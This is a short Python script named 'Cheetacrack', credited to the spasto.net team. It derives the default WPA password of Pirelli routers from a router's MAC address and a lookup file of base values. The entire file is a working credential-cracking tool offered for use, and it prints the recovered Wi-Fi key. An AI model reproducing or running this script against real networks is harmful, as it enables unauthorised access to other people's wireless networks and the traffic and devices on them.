#   This program is free software; you can redistribute it and/or modify  
#   it under the terms of the GNU General Public License as published by  
#   the Free Software Foundation; either version 2 of the License, or     
#   (at your option) any later version.                                   
                                                                         
#   This program is distributed in the hope that it will be useful,       
#   but WITHOUT ANY WARRANTY; without even the implied warranty of        
#   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the         
#   GNU General Public License for more details.    

import sys
import fileinput

def stampa():
	print "*************************************************"
	print "*                                               *" 
	print "*     Cheetacrack python script                 *"
	print "*     for Pirelli routers                       *"
	print "*     by spasto.net team                        *"
	print "*************************************************"
	print ""
	print "usage: python cheetacrack.py <mac_addres> <file_input> "
	print ""
	print "Example: python cheetacrack.py 38:22:9D:A3:00:00 bases.lst"
	print ""

if(len(sys.argv)>2):
	mac_addr=sys.argv[1]
	fin=sys.argv[2]
	wmac=mac_addr[:8]
	mac6=mac_addr[9:17]
	try:
		for riga in fileinput.input(fin):
			da=riga[9:17]
			a=riga[18:26]
			if((riga[:8]==wmac) and (da<mac6<a)):	
				sn1=riga[27:32]
				base=riga[33:39]
				inc=riga[40]
				esito=bool(1)
				break
			else:
				esito=bool(0)
	except IOError:
		print "No such file"
		sys.exit()	
	if(not(esito)):	
		print "Mac is not on the list"
		sys.exit()
	mac6=mac6.replace(':','') 
	mac6=int(mac6,16)
	base=int(base,16)
	inc=int(inc)
	ris=mac6-base
	ris=ris/inc
	ris=str(ris)
	print "*************************************"
	print "* Code found:                       *"
	print "* MAC =",mac_addr,"                 *"
	print "* WPA = ",sn1+'Y00'+ris,"           *"
	print "*                                   *"
	print "*************************************"
else:
	stampa()
